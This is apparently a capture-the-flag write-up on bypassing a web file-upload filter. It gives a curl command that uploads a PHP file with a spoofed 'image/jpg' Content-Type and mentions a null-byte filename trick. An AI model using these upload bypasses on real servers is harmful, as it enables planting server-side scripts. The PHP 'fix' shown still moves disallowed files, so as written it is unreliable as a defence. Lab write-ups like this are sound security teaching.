# File Upload - Content Type

We can upload any file as long as we set `Content-Type` HTTP header to `image/jpg`.

## How-To

1. Go to `/?page=upload`
1. Inspect the form
1. Open a terminal and use the following command

	```sh
	touch exploit.php && curl -X POST 'http://192.168.56.106/?page=upload' -F 'MAX_FILE_SIZE=100000' -F 'uploaded=@exploit.php;type=image/jpg' -F 'Upload=Upload' | grep 'flag'
	```

## Fix

- Check file content MIME type instead of extension or provided `Content-Type`.

	```php
	/**
	 * https://stackoverflow.com/questions/59986082/php-how-to-properly-check-mime-type-of-a-file
	 */
	if (is_uploaded_file($_FILES['input_name']['tmp_name']))
	{
		$allowed_file_types = ['image/png', 'image/jpeg'];
		$mime_type = mime_content_type($_FILES['input_name']['tmp_name']);

		if (! in_array($mime_type, $allowed_file_types)) {
			// File type is NOT allowed.
		}

		$destination = '/path/to/move/your/file/';

		if (move_uploaded_file ($_FILES['input_name']['tmp_name'] , $destination)) {
			// File moved to the destination
		}
	}
	```

## Details

- The first approach was to increase the `MAX_FILE_SIZE`, but nothing.
- Then I tried to upload a `PHP` file using a NULL byte (`\0`) in the file name to make it looks like a `JPG` (`exploit.php%00.jpg`), the upload works, but no flag.

## Resources

- Command : [CURL](https://curl.se/docs/manpage.html)
- PHP : [is_uploaded_file](https://www.php.net/manual/en/function.is-uploaded-file.php)
- PHP : [mime_content_type](https://www.php.net/manual/en/function.mime-content-type.php)
- PHP : [move_uploaded_file](https://www.php.net/manual/en/function.move-uploaded-file.php)
